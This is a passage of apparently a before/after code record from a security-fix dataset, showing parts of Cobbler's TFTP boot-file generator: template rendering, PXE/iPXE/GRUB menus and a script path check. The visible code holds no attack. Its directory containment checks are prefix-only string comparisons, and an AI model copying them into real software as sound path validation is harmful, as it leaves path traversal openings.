top level\n\n        (success, templates) = utils.input_string_or_dict(templates)\n\n        if not success:\n            return results\n\n        # FIXME: img_path and local_img_path should probably be moved up into the blender function to ensure they're\n        #  consistently available to templates across the board.\n        if blended[\"distro_name\"]:\n            blended['img_path'] = os.path.join(\"/images\", blended[\"distro_name\"])\n            blended['local_img_path'] = os.path.join(self.bootloc, \"images\", blended[\"distro_name\"])\n\n        for template in list(templates.keys()):\n            dest = templates[template]\n            if dest is None:\n                continue\n\n            # Run the source and destination files through templar first to allow for variables in the path\n            template = self.templar.render(template, blended, None).strip()\n            dest = os.path.normpath(self.templar.render(dest, blended, None).strip())\n            # Get the path for the destination output\n            dest_dir = os.path.normpath(os.path.dirname(dest))\n\n            # If we're looking for a single template, skip if this ones destination is not it.\n            if path is not None and path != dest:\n                continue\n\n            # If we are writing output to a file, we allow files tobe written into the tftpboot directory, otherwise\n            # force all templated configs into the rendered directory to ensure that a user granted cobbler privileges\n            # via sudo can't overwrite arbitrary system files (This also makes cleanup easier).\n            if os.path.isabs(dest_dir) and write_file:\n                if dest_dir.find(self.bootloc) != 0:\n                    raise CX(\" warning: template destination (%s) is outside %s, skipping.\" % (dest_dir, self.bootloc))\n            elif write_file:\n                dest_dir = os.path.join(self.settings.webdir, \"rendered\", dest_dir)\n                dest = os.path.join(dest_dir, os.path.basename(dest))\n                if not os.path.exists(dest_dir):\n                    utils.mkdir(dest_dir)\n\n            # Check for problems\n            if not os.path.exists(template):\n                raise CX(\"template source %s does not exist\" % template)\n            elif write_file and not os.path.isdir(dest_dir):\n                raise CX(\"template destination (%s) is invalid\" % dest_dir)\n            elif write_file and os.path.exists(dest):\n                raise CX(\"template destination (%s) already exists\" % dest)\n            elif write_file and os.path.isdir(dest):\n                raise CX(\"template destination (%s) is a directory\" % dest)\n            elif template == \"\" or dest == \"\":\n                raise CX(\"either the template source or destination was blank (unknown variable used?)\")\n\n            template_fh = open(template)\n            template_data = template_fh.read()\n            template_fh.close()\n\n            buffer = self.templar.render(template_data, blended, None)\n            results[dest] = buffer\n\n            if write_file:\n                self.logger.info(\"generating: %s\", dest)\n                fd = open(dest, \"w\")\n                fd.write(buffer)\n                fd.close()\n\n        return results\n\n    def generate_ipxe(self, what: str, name: str) -> str:\n        \"\"\"\n        Generate the ipxe files.\n\n        :param what: Either \"profile\" or \"system\". All other item types not valid.\n        :param name: The name of the profile or system.\n        :return: The rendered template.\n        \"\"\"\n        if what.lower() not in (\"profile\", \"image\", \"system\"):\n            return \"# ipxe is only valid for profiles, images and systems\"\n\n        distro = None\n        image = None\n        profile = None\n        system = None\n        if what == \"profile\":\n            profile = self.api.find_profile(name=name)\n            if profile:\n                distro = profile.get_conceptual_parent()\n        elif what == \"image\":\n            image = self.api.find_image(name=name)\n        else:\n            system = self.api.find_system(name=name)\n            if system:\n                profile = system.get_conceptual_parent()\n            if profile and profile.COLLECTION_TYPE == \"profile\":\n                distro = profile.get_conceptual_parent()\n            else:\n                image = profile\n                profile = None\n\n        if distro:\n            arch = distro.arch\n        elif image:\n            arch = image.arch\n        else:\n            return \"\"\n\n        result = self.write_pxe_file(None, system, profile, distro, arch, image, format='ipxe')\n        return \"\" if not result else result\n\n    def generate_bootcfg(self, what: str, name: str) -> str:\n        \"\"\"\n        Generate a bootcfg for a system of profile.\n\n        :param what: The type for what the bootcfg is generated for. Must be \"profile\" or \"system\".\n        :param name: The name of the item which the bootcfg should be generated for.\n        :return: The fully rendered bootcfg as a string.\n        \"\"\"\n        if what.lower() not in (\"profile\", \"system\"):\n            return \"# bootcfg is only valid for profiles and systems\"\n\n        if what == \"profile\":\n            obj = self.api.find_profile(name=name)\n            distro = obj.get_conceptual_parent()\n        else:\n            obj = self.api.find_system(name=name)\n            distro = obj.get_conceptual_parent().get_conceptual_parent()\n\n        # For multi-arch distros, the distro name in distro_mirror may not contain the arch string, so we need to figure\n        # out the path based on where the kernel is stored. We do this because some distros base future downloads on the\n        # initial URL passed in, so all of the files need to be at this location (which is why we can't use the images\n        # link, which just contains the kernel and initrd).\n        distro_mirror_name = ''.join(distro.kernel.split('/')[-2:-1])\n\n        blended = utils.blender(self.api, False, obj)\n\n        if distro.os_version.startswith(\"esxi\"):\n            with open(os.path.join(os.path.dirname(distro.kernel), 'boot.cfg')) as f:\n                bootmodules = re.findall(r'modules=(.*)', f.read())\n                for modules in bootmodules:\n                    blended['esx_modules'] = modules.replace('/', '')\n\n        autoinstall_meta = blended.get(\"autoinstall_meta\", {})\n        try:\n            del blended[\"autoinstall_meta\"]\n        except:\n            pass\n        blended.update(autoinstall_meta)  # make available at top level\n\n        blended['distro'] = distro_mirror_name\n\n        # FIXME: img_path should probably be moved up into the blender function to ensure they're consistently\n        #        available to templates across the board\n        if obj.enable_ipxe:\n            blended['img_path'] = 'http://%s:%s/cobbler/links/%s' % (self.settings.server, self.settings.http_port,\n                                                                     distro.name)\n        else:\n            blended['img_path'] = os.path.join(\"/images\", distro.name)\n\n        template = os.path.join(self.settings.boot_loader_conf_template_dir, \"bootcfg.template\")\n        if not os.path.exists(template):\n            return \"# boot.cfg template not found for the %s named %s (filename=%s)\" % (what, name, template)\n\n        template_fh = open(template)\n        template_data = template_fh.read()\n        template_fh.close()\n\n        return self.templar.render(template_data, blended, None)\n\n    def generate_script(self, what: str, objname: str, script_name: str) -> str:\n        \"\"\"\n        Generate a script from a autoinstall script template for a given profile or system.\n\n        :param what: The type for what the bootcfg is generated for. Must be \"profile\" or \"system\".\n        :param objname: The name of the item which the bootcfg should be generated for.\n        :param script_name: The name of the template which should be rendered for the system or profile.\n        :return: The fully rendered script as a string.\n        \"\"\"\n        if what == \"profile\":\n            obj = self.api.find_profile(name=objname)\n        elif what == \"system\":\n            obj = self.api.find_system(name=objname)\n        else:\n            raise ValueError(\"\\\"what\\\" needs to be either \\\"profile\\\" or \\\"system\\\"!\")\n\n        if not validate_autoinstall_script_name(script_name):\n            raise ValueError(\"\\\"script_name\\\" handed to generate_script was not valid!\")\n\n        if not obj:\n            return \"# \\\"%s\\\" named \\\"%s\\\" not found\" % (what, objname)\n\n        distro = obj.get_conceptual_parent()\n        while distro.get_conceptual_parent():\n            distro = distro.get_conceptual_parent()\n\n        blended = utils.blender(self.api, False, obj)\n\n        autoinstall_meta = blended.get(\"autoinstall_meta\", {})\n        try:\n            del blended[\"autoinstall_meta\"]\n        except:\n            pass\n        blended.update(autoinstall_meta)  # make available at top level\n\n        # FIXME: img_path should probably be moved up into the blender function to ensure they're consistently\n        #        available to templates across the board\n        if obj.enable_ipxe:\n            blended['img_path'] = 'http://%s:%s/cobbler/links/%s' % (self.settings.server, self.settings.http_port,\n                                                                     distro.name)\n        else:\n            blended['img_path'] = os.path.join(\"/images\", distro.name)\n\n        scripts_root = \"/var/lib/cobbler/scripts\"\n        template = os.path.normpath(os.path.join(scripts_root, script_name))\n        if not template.startswith(scripts_root):\n            return \"# script template \\\"%s\\\" could not be found in the script root\" % script_name\n        if not os.path.exists(template):\n            return \"# script template \\\"%s\\\" not found\" % script_name\n\n        with open(template) as template_fh:\n            template_data = template_fh.read()\n\n        return self.templar.render(template_data, blended, None)\n\n    def _build_windows_initrd(self, loader_name: str, custom_loader_name: str, format: str) -> str:\n        \"\"\"\n        Generate a initrd metadata for Windows.\n\n        :param loader_name: The loader name.\n        :param custom_loader_name: The loader name in profile or system.\n        :param format: Can be any of those returned by get_supported_system_boot_loaders.\n        :return: The fully generated initrd string for the boot loader.\n        \"\"\"\n        initrd_line = custom_loader_name\n\n        if format == \"ipxe\":\n            initrd_line = \"--name \" + loader_name + \" \" + custom_loader_name + \" \" + loader_name\n\n        return initrd_line\n\n    def _generate_initrd(self, autoinstall_meta: dict, kernel_path, initrd_path, format: str) -> List[str]:\n        \"\"\"\n        Generate a initrd metadata.\n\n        :param autoinstall_meta: The kernel options.\n        :param kernel_path: Path to the kernel.\n        :param initrd_path: Path to the initrd.\n        :param format: Can be any of those returned by get_supported_system_boot_loaders.\n        :return: The array of additional boot load files.\n        \"\"\"\n        initrd = []\n        if \"initrd\" in autoinstall_meta:\n            initrd = autoinstall_meta[\"initrd\"]\n\n        if kernel_path and \"wimboot\" in kernel_path:\n            remote_boot_files = utils.file_is_remote(kernel_path)\n\n            if remote_boot_files:\n                loaders_path = 'http://@@http_server@@/cobbler/images/@@distro_name@@/'\n                initrd_path = loaders_path + os.path.basename(initrd_path)\n            else:\n                (loaders_path, kernel_name) = os.path.split(kernel_path)\n                loaders_path += '/'\n\n            bootmgr_path = bcd_path = wim_path = loaders_path\n\n            if initrd_path:\n                initrd.append(self._build_windows_initrd(\"boot.sdi\", initrd_path, format))\n            if \"bootmgr\" in autoinstall_meta:\n                initrd.append(self._build_windows_initrd(\"bootmgr.exe\", bootmgr_path + autoinstall_meta[\"bootmgr\"],\n                                                         format))\n            if \"bcd\" in autoinstall_meta:\n                initrd.append(self._build_windows_initrd(\"bcd\", bcd_path + autoinstall_meta[\"bcd\"], format))\n            if \"winpe\" in autoinstall_meta:\n                initrd.append(self._build_windows_initrd(\"winpe.wim\", wim_path + autoinstall_meta[\"winpe\"], format))\n        else:\n            if initrd_path:\n                initrd.append(initrd_path)\n\n        return initrd\n", "code_before": "\"\"\"\nGenerate files provided by TFTP server based on Cobbler object tree.\nThis is the code behind 'cobbler sync'.\n\nCopyright 2006-2009, Red Hat, Inc and Others\nMichael DeHaan <michael.dehaan AT gmail>\n\nThis program is free software; you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation; either version 2 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with this program; if not, write to the Free Software\nFoundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA\n02110-1301  USA\n\"\"\"\nimport logging\nimport os\nimport os.path\nimport re\nimport socket\nfrom typing import Dict, List, Optional\n\nfrom cobbler import enums, templar, utils\nfrom cobbler.cexceptions import CX\nfrom cobbler.enums import Archs\nfrom cobbler.validate import validate_autoinstall_script_name\n\n\nclass TFTPGen:\n    \"\"\"\n    Generate files provided by TFTP server\n    \"\"\"\n\n    def __init__(self, collection_mgr):\n        \"\"\"\n        Constructor\n        \"\"\"\n        self.collection_mgr = collection_mgr\n        self.logger = logging.getLogger()\n        self.api = collection_mgr.api\n        self.distros = collection_mgr.distros()\n        self.profiles = collection_mgr.profiles()\n        self.systems = collection_mgr.systems()\n        self.settings = collection_mgr.settings()\n        self.repos = collection_mgr.repos()\n        self.images = collection_mgr.images()\n        self.menus = collection_mgr.menus()\n        self.templar = templar.Templar(collection_mgr)\n        self.bootloc = self.settings.tftpboot_location\n\n    def copy_bootloaders(self, dest):\n        \"\"\"\n        Copy bootloaders to the configured tftpboot directory\n        NOTE: we support different arch's if defined in our settings file.\n        \"\"\"\n        src = self.settings.bootloaders_dir\n        dest = self.bootloc\n        # Unfortunately using shutils copy_tree the dest directory must not exist, but we must not delete an already\n        # partly synced /srv/tftp dir here. rsync is very convenient here, being very fast on an already copied folder.\n        utils.subprocess_call(\n            [\"rsync\", \"-rpt\", \"--copy-links\", \"--exclude=.cobbler_postun_cleanup\", \"{src}/\".format(src=src), dest],\n            shell=False\n        )\n        src = self.settings.grubconfig_dir\n        utils.subprocess_call(\n            [\"rsync\", \"-rpt\", \"--copy-links\", \"--exclude=README.grubconfig\", \"{src}/\".format(src=src), dest],\n            shell=False\n        )\n\n    def copy_images(self):\n        \"\"\"\n        Like copy_distros except for images.\n        \"\"\"\n        errors = list()\n        for i in self.images:\n            try:\n                self.copy_single_image_files(i)\n            except CX as e:\n                errors.append(e)\n                self.logger.error(e.value)\n\n    def copy_single_distro_file(self, d_file: str, distro_dir: str, symlink_ok: bool):\n        \"\"\"\n        Copy a single file (kernel/initrd) to distro's images directory\n\n        :param d_file:     distro's kernel/initrd absolut or remote file path value\n        :param distro_dir: directory (typically in {www,tftp}/images) where to copy the file\n        :param symlink_ok: whethere it is ok to symlink the file. Typically false in case the file is used by daemons\n                            run in chroot environments (tftpd,..)\n        :raises FileNotFoundError: Raised in case no kernel was found.\n        \"\"\"\n        full_path = utils.find_kernel(d_file)\n\n        if not full_path:\n            full_path = utils.find_initrd(d_file)\n\n        if full_path is None or not full_path:\n            # Will raise if None or an empty str\n            raise FileNotFoundError(\"No kernel found at \\\"%s\\\", tried to copy to: \\\"%s\\\"\" % (d_file, distro_dir))\n\n        # Koan manages remote kernel/initrd itself, but for consistent PXE\n        # configurations the synchronization is still necessary\n        if not utils.file_is_remote(full_path):\n            b_file = os.path.basename(full_path)\n            dst = os.path.join(distro_dir, b_file)\n            utils.linkfile(full_path, dst, symlink_ok=symlink_ok, api=self.api)\n        else:\n            b_file = os.path.basename(full_path)\n            dst = os.path.join(distro_dir, b_file)\n            utils.copyremotefile(full_path, dst, api=None)\n\n    def copy_single_distro_files(self, d, dirtree, symlink_ok: bool):\n        \"\"\"\n        Copy the files needed for a single distro.\n\n        :param d: The distro to copy.\n        :param dirtree: This is the root where the images are located. The folder \"images\" gets automatically appended.\n        :param symlink_ok: If it is okay to use a symlink to link the destination to the source.\n        \"\"\"\n\n        distros = os.path.join(dirtree, \"images\")\n        distro_dir = os.path.join(distros, d.name)\n        utils.mkdir(distro_dir)\n        self.copy_single_distro_file(d.kernel, distro_dir, symlink_ok)\n        self.copy_single_distro_file(d.initrd, distro_dir, symlink_ok)\n\n    def copy_single_image_files(self, img):\n        \"\"\"\n        Copies an image to the images directory of Cobbler.\n\n        :param img: The image to copy.\n        \"\"\"\n        images_dir = os.path.join(self.bootloc, \"images2\")\n        filename = img.file\n        if not os.path.exists(filename):\n            # likely for virtual usage, cannot use\n            return\n        if not os.path.exists(images_dir):\n            os.makedirs(images_dir)\n        newfile = os.path.join(images_dir, img.name)\n        utils.linkfile(filename, newfile, api=self.api)\n\n    def write_all_system_files(self, system, menu_items):\n        \"\"\"\n        Writes all files for tftp for a given system with the menu items handed to this method. The system must have a\n        profile attached. Otherwise this method throws an error.\n\n        :param system: The system to generate files for.\n        :param menu_items: TODO\n        \"\"\"\n        profile = system.get_conceptual_parent()\n        if profile is None:\n            raise CX(\"system %(system)s references a missing profile %(profile)s\" % {\"system\": system.name,\n                                                                                     \"profile\": system.profile})\n\n        distro = profile.get_conceptual_parent()\n        image_based = False\n        image = None\n        if distro is None:\n            if profile.COLLECTION_TYPE == \"profile\":\n                raise CX(\"profile %(profile)s references a missing distro %(distro)s\" % {\"profile\": system.profile,\n                                                                                         \"distro\": profile.distro})\n            else:\n                image_based = True\n                image = profile\n\n        pxe_metadata = {'menu_items': menu_items}\n\n        # hack: s390 generates files per system not per interface\n        if not image_based and distro.arch in (enums.Archs.S390, enums.Archs.S390X):\n            short_name = system.name.split('.')[0]\n            s390_name = 'linux' + short_name[7:10]\n            self.logger.info(\"Writing s390x pxe config for %s\", short_name)\n            # Always write a system specific _conf and _parm file\n            pxe_f = os.path.join(self.bootloc, \"s390x\", \"s_%s\" % s390_name)\n            conf_f = \"%s_conf\" % pxe_f\n            parm_f = \"%s_parm\" % pxe_f\n\n            self.logger.info(\"Files: (conf,param) - (%s,%s)\", conf_f, parm_f)\n            blended = utils.blender(self.api, True, system)\n            # FIXME: profiles also need this data!\n            # gather default kernel_options and default kernel_options_s390x\n            kernel_options = self.build_kernel_options(system, profile, distro,\n                                                       image, \"s390x\", blended.get(\"autoinstall\", \"\"))\n            kopts_aligned = \"\"\n            column = 0\n            for option in kernel_options.split():\n                opt_len = len(option)\n                if opt_len > 78:\n                    kopts_aligned += '\\n' + option + ' '\n                    column = opt_len + 1\n                    self.logger.error(\"Kernel paramer [%s] too long %s\" % (option, opt_len))\n                    continue\n                if column + opt_len > 78:\n                    kopts_aligned += '\\n' + option + ' '\n                    column = opt_len + 1\n                else:\n                    kopts_aligned += option + ' '\n                    column += opt_len + 1\n\n            # Write system specific zPXE file\n            if system.is_management_supported():\n                if system.netboot_enabled:\n                    self.logger.info(\"S390x: netboot_enabled\")\n                    kernel_path = os.path.join(\"/images\", distro.name, os.path.basename(distro.kernel))\n                    initrd_path = os.path.join(\"/images\", distro.name, os.path.basename(distro.initrd))\n                    with open(pxe_f, 'w') as out:\n                        out.write(kernel_path + '\\n' + initrd_path + '\\n')\n                    with open(parm_f, 'w') as out:\n                        out.write(kopts_aligned)\n                    # Write conf file with one newline in it if netboot is enabled\n                    with open(conf_f, 'w') as out:\n                        out.write('\\n')\n                else:\n                    self.logger.info(\"S390x: netboot_disabled\")\n                    # Write empty conf file if netboot is disabled\n                    open(conf_f, 'w').close()\n            else:\n                # ensure the files do exist\n                self.logger.info(\"S390x: management not supported\")\n                utils.rmfile(pxe_f)\n                utils.rmfile(conf_f)\n                utils.rmfile(parm_f)\n            self.logger.info(\"S390x: pxe: [%s], conf: [%s], parm: [%s]\", pxe_f, conf_f, parm_f)\n\n            return\n\n        # generate one record for each described NIC ..\n        for (name, _) in list(system.interfaces.items()):\n\n            # Passing \"pxe\" here is a hack, but we need to make sure that\n            # get_config_filename() will return a filename in the pxelinux\n            # format.\n            pxe_name = system.get_config_filename(interface=name, loader=\"pxe\")\n            grub_name = system.get_config_filename(interface=name, loader=\"grub\")\n\n            if pxe_name is not None:\n                pxe_path = os.path.join(self.bootloc, \"pxelinux.cfg\", pxe_name)\n            else:\n                pxe_path = \"\"\n\n            if grub_name is not None:\n                grub_path = os.path.join(self.bootloc, \"grub\", \"system\", grub_name)\n            else:\n                grub_path = \"\"\n\n            if grub_path == \"\" and pxe_path == \"\":\n                self.logger.warning(\"invalid interface recorded for system (%s,%s)\", system.name, name)\n                continue\n\n            if image_based:\n                working_arch = image.arch\n            else:\n                working_arch = distro.arch\n\n            if working_arch is None:\n                raise CX(\"internal error, invalid arch supplied\")\n\n            # for tftp only ...\n            if working_arch in [Archs.I386, Archs.X86_64, Archs.ARM, Archs.AARCH64,\n                                Archs.PPC, Archs.PPC64, Archs.PPC64LE, Archs.PPC64EL]:\n                # ToDo: This is old, move this logic into item_system.get_config_filename()\n                pass\n            else:\n                continue\n\n            if system.is_management_supported():\n                if not image_based:\n                    if pxe_path:\n                        self.write_pxe_file(pxe_path, system, profile, distro,\n                                            working_arch, metadata=pxe_metadata)\n                    if grub_path:\n                        self.write_pxe_file(grub_path, system, profile, distro,\n                                            working_arch, format=\"grub\")\n                        # Generate a link named after system to the mac file for easier lookup\n                        link_path = os.path.join(self.bootloc, \"grub\", \"system_link\", system.name)\n                        utils.rmfile(link_path)\n                        utils.mkdir(os.path.dirname(link_path))\n                        os.symlink(os.path.join(\"..\", \"system\", grub_name), link_path)\n                else:\n                    self.write_pxe_file(pxe_path, system, None, None, working_arch, image=profile,\n                                        metadata=pxe_metadata)\n            else:\n                # ensure the file doesn't exist\n                utils.rmfile(pxe_path)\n                if grub_path:\n                    utils.rmfile(grub_path)\n\n    def make_pxe_menu(self) -> Dict[str, str]:\n        \"\"\"\n        Generates pxe, ipxe and grub boot menus.\n        \"\"\"\n        # only do this if there is NOT a system named default.\n        default = self.systems.find(name=\"default\")\n\n        if default is None:\n            timeout_action = \"local\"\n        else:\n            timeout_action = default.profile\n\n        boot_menu = {}\n        metadata = self.get_menu_items()\n        loader_metadata = metadata\n        menu_items = metadata[\"menu_items\"]\n        menu_labels = metadata[\"menu_labels\"]\n        loader_metadata[\"pxe_timeout_profile\"] = timeout_action\n\n        # Write the PXE menu:\n        if 'pxe' in menu_items:\n            loader_metadata[\"menu_items\"] = menu_items['pxe']\n            loader_metadata[\"menu_labels\"] = {}\n            outfile = os.path.join(self.bootloc, \"pxelinux.cfg\", \"default\")\n            template_src = open(os.path.join(self.settings.boot_loader_conf_template_dir, \"pxe_menu.template\"))\n            template_data = template_src.read()\n            boot_menu['pxe'] = self.templar.render(template_data, loader_metadata, outfile)\n            template_src.close()\n\n        # Write the iPXE menu:\n        if 'ipxe' in menu_items:\n            loader_metadata[\"menu_items\"] = menu_items['ipxe']\n            loader_metadata[\"menu_labels\"] = menu_labels['ipxe']\n            outfile = os.path.join(self.bootloc, \"ipxe\", \"default.ipxe\")\n            template_src = open(os.path.join(self.settings.boot_loader_conf_template_dir, \"ipxe_menu.template\"))\n            template_data = template_src.read()\n            boot_menu['ipxe'] = self.templar.render(template_data, loader_metadata, outfile)\n            template_src.close()\n\n        # Write the grub menu:\n        for arch in utils.get_valid_archs():\n            arch_metadata = self.get_menu_items(arch)\n            arch_menu_items = arch_metadata[\"menu_items\"]\n\n            if 'grub' in arch_menu_items:\n                boot_menu[\"grub\"] = arch_menu_items\n                outfile = os.path.join(self.bootloc, \"grub\", \"{0}_menu_items.cfg\".format(arch))\n                with open(outfile, \"w+\") as fd:\n                    fd.write(arch_menu_items[\"grub\"])\n        return boot_menu\n\n    def get_menu_items(self, arch: Optional[str] = None) -> dict:\n        \"\"\"\n        Generates menu items for pxe, ipxe and grub. Grub menu items are grouped into submenus by profile.\n\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        :returns: A dictionary with the pxe, ipxe and grub menu items. It has the keys from\n                  utils.get_supported_system_boot_loaders().\n        \"\"\"\n        return self.get_menu_level(None, arch)\n\n    def get_submenus(self, menu, metadata: dict, arch: str):\n        \"\"\"\n        Generates submenus metatdata for pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        \"\"\"\n        if menu:\n            child_names = menu.get_children(sort_list=True)\n            childs = []\n            for child in child_names:\n                child = self.api.find_menu(name=child)\n                if child is not None:\n                    childs.append(child)\n        else:\n            childs = [child for child in self.menus if child.parent is None]\n\n        nested_menu_items = {}\n        menu_labels = {}\n        boot_loaders = utils.get_supported_system_boot_loaders()\n\n        for child in childs:\n            temp_metadata = self.get_menu_level(child, arch)\n            temp_items = temp_metadata[\"menu_items\"]\n\n            for boot_loader in boot_loaders:\n                if boot_loader in temp_items:\n                    if boot_loader in nested_menu_items:\n                        nested_menu_items[boot_loader] += temp_items[boot_loader]\n                    else:\n                        nested_menu_items[boot_loader] = temp_items[boot_loader]\n\n            if \"ipxe\" in temp_items:\n                if \"ipxe\" not in menu_labels:\n                    menu_labels[\"ipxe\"] = []\n                display_name = child.display_name if child.display_name and child.display_name != \"\" else child.name\n                menu_labels[\"ipxe\"].append({\"name\": child.name, \"display_name\": display_name})\n\n        for boot_loader in boot_loaders:\n            if boot_loader in nested_menu_items and nested_menu_items[boot_loader] != \"\":\n                nested_menu_items[boot_loader] = nested_menu_items[boot_loader][:-1]\n\n        metadata[\"menu_items\"] = nested_menu_items\n        metadata[\"menu_labels\"] = menu_labels\n\n    def get_profiles_menu(self, menu, metadata, arch: str):\n        \"\"\"\n        Generates profiles metadata for pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        \"\"\"\n        if menu:\n            profile_list = [profile for profile in self.profiles if profile.menu == menu.name]\n        else:\n            profile_list = [profile for profile in self.profiles if profile.menu is None or profile.menu == \"\"]\n        profile_list = sorted(profile_list, key=lambda profile: profile.name)\n        if arch:\n            profile_list = [profile for profile in profile_list if profile.arch == arch]\n\n        current_menu_items = {}\n        menu_labels = metadata[\"menu_labels\"]\n\n        for profile in profile_list:\n            if not profile.enable_menu:\n                # This profile has been excluded from the menu\n                continue\n            arch = None\n            distro = profile.get_conceptual_parent()\n            boot_loaders = profile.boot_loaders\n\n            if distro:\n                arch = distro.arch\n\n            for boot_loader in boot_loaders:\n                if boot_loader not in profile.boot_loaders:\n                    continue\n                contents = self.write_pxe_file(filename=None, system=None, profile=profile, distro=distro, arch=arch,\n                                               image=None, format=boot_loader)\n                if contents and contents != \"\":\n                    if boot_loader not in current_menu_items:\n                        current_menu_items[boot_loader] = \"\"\n                    current_menu_items[boot_loader] += contents\n\n                    # iPXE Level menu\n                    if boot_loader == \"ipxe\":\n                        current_menu_items[boot_loader] += \"\\n\"\n                        if \"ipxe\" not in menu_labels:\n                            menu_labels[\"ipxe\"] = []\n                        menu_labels[\"ipxe\"].append({\"name\": profile.name, \"display_name\": profile.name})\n\n        metadata[\"menu_items\"] = current_menu_items\n        metadata[\"menu_labels\"] = menu_labels\n\n    def get_images_menu(self, menu, metadata, arch: str):\n        \"\"\"\n        Generates profiles metadata for pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param metadata: Pass additional parameters to the ones being collected during the method.\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        \"\"\"\n        if menu:\n            image_list = [image for image in self.images if image.menu == menu.name]\n        else:\n            image_list = [image for image in self.images if image.menu is None or image.menu == \"\"]\n        image_list = sorted(image_list, key=lambda image: image.name)\n\n        current_menu_items = metadata[\"menu_items\"]\n        menu_labels = metadata[\"menu_labels\"]\n\n        # image names towards the bottom\n        for image in image_list:\n            if os.path.exists(image.file):\n                arch = image.arch\n                boot_loaders = image.boot_loaders\n\n                for boot_loader in boot_loaders:\n                    if boot_loader not in image.boot_loaders:\n                        continue\n                    contents = self.write_pxe_file(filename=None, system=None, profile=None, distro=None, arch=arch,\n                                                   image=image, format=boot_loader)\n                    if contents and contents != \"\":\n                        if boot_loader not in current_menu_items:\n                            current_menu_items[boot_loader] = \"\"\n                        current_menu_items[boot_loader] += contents\n\n                        # iPXE Level menu\n                        if boot_loader == \"ipxe\":\n                            current_menu_items[boot_loader] += \"\\n\"\n                            if \"ipxe\" not in menu_labels:\n                                menu_labels[\"ipxe\"] = []\n                            menu_labels[\"ipxe\"].append({\"name\": image.name, \"display_name\": image.name})\n\n        boot_loaders = utils.get_supported_system_boot_loaders()\n        for boot_loader in boot_loaders:\n            if boot_loader in current_menu_items and current_menu_items[boot_loader] != \"\":\n                current_menu_items[boot_loader] = current_menu_items[boot_loader][:-1]\n\n        metadata[\"menu_items\"] = current_menu_items\n        metadata[\"menu_labels\"] = menu_labels\n\n    def get_menu_level(self, menu=None, arch: str = None) -> dict:\n        \"\"\"\n        Generates menu items for submenus, pxe, ipxe and grub.\n\n        :param menu: The menu for which boot files are generated. (Optional)\n        :param arch: The processor architecture to generate the menu items for. (Optional)\n        :returns: A dictionary with the pxe and grub menu items. It has the keys from\n                  utils.get_supported_system_boot_loaders().\n        \"\"\"\n        metadata = {}\n        template_data = {}\n        boot_loaders = utils.get_supported_system_boot_loaders()\n\n        for boot_loader in boot_loaders:\n            template = os.path.join(self.settings.boot_loader_conf_template_dir, \"%s_submenu.template\" % boot_loader)\n            if os.path.exists(template):\n                with open(template) as template_fh:\n                    template_data[boot_loader] = template_fh.read()\n                if menu:\n                    parent_menu = menu.parent\n                    metadata[\"menu_name\"] = menu.name\n                    metadata[\"menu_label\"] = \\\n                        menu.display_name if menu.display_name and menu.display_name != \"\" else menu.name\n                    if parent_menu:\n                        metadata[\"parent_menu_name\"] = parent_menu.name\n                        if parent_menu.display_name and parent_menu.display_name != \"\":\n                            metadata[\"parent_menu_label\"] = parent_menu.display_name\n                        else:\n                            metadata[\"parent_menu_label\"] = parent_menu.name\n                    else:\n                        metadata[\"parent_menu_name\"] = \"Cobbler\"\n                        metadata[\"parent menu_label\"] = \"Cobbler\"\n            else:\n                self.logger.warning(\"Template for building a submenu not found for bootloader \\\"%s\\\"! Submenu \"\n                                    \"structure thus missing for this bootloader.\", boot_loader)\n\n        self.get_submenus(menu, metadata, arch)\n        nested_menu_items = metadata[\"menu_items\"]\n        self.get_profiles_menu(menu, metadata, arch)\n        current_menu_items = metadata[\"menu_items\"]\n        self.get_images_menu(menu, metadata, arch)\n        current_menu_items = metadata[\"menu_items\"]\n\n        menu_items = {}\n        menu_labels = metadata[\"menu_labels\"]\n        line_pat = re.compile(r\"^(.+)$\", re.MULTILINE)\n        line_sub = \"\\t\\\\g<1>\"\n\n        for boot_loader in boot_loaders:\n            if boot_loader not in nested_menu_items and boot_loader not in current_menu_items:\n                continue\n\n            menu_items[boot_loader] = \"\"\n            if boot_loader == \"ipxe\":\n                if menu:\n                    if boot_loader in current_menu_items:\n                        menu_items[boot_loader] = current_menu_items[boot_loader]\n                    if boot_loader in nested_menu_items:\n                        menu_items[boot_loader] += nested_menu_items[boot_loader]\n                else:\n                    if boot_loader in nested_menu_items:\n                        menu_items[boot_loader] = nested_menu_items[boot_loader]\n                    if boot_loader in current_menu_items:\n                        menu_items[boot_loader] += '\\n' + current_menu_items[boot_loader]\n            else:\n                if boot_loader in nested_menu_items:\n                    menu_items[boot_loader] = nested_menu_items[boot_loader]\n                if boot_loader in current_menu_items:\n                    if menu is None:\n                        menu_items[boot_loader] += '\\n'\n                    menu_items[boot_loader] += current_menu_items[boot_loader]\n                # Indentation for nested pxe and grub menu items.\n                if menu:\n                    menu_items[boot_loader] = line_pat.sub(line_sub, menu_items[boot_loader])\n\n            if menu and boot_loader in template_data:\n                metadata[\"menu_items\"] = menu_items[boot_loader]\n                if boot_loader in menu_labels:\n                    metadata[\"menu_labels\"] = menu_labels[boot_loader]\n                menu_items[boot_loader] = self.templar.render(template_data[boot_loader], metadata, None)\n                if boot_loader == \"ipxe\":\n                    menu_items[boot_loader] += '\\n'\n        metadata[\"menu_items\"] = menu_items\n        metadata[\"menu_labels\"] = menu_labels\n        return metadata\n\n    def write_pxe_file(self, filename, system, profile, distro, arch: Archs, image=None, metadata=None,\n                       format: str = \"pxe\") -> str:\n        \"\"\"\n        Write a configuration file for the boot loader(s).\n\n        More system-specific configuration may come in later, if so that would appear inside the system object in api.py\n        Can be used for different formats, \"pxe\" (default) and 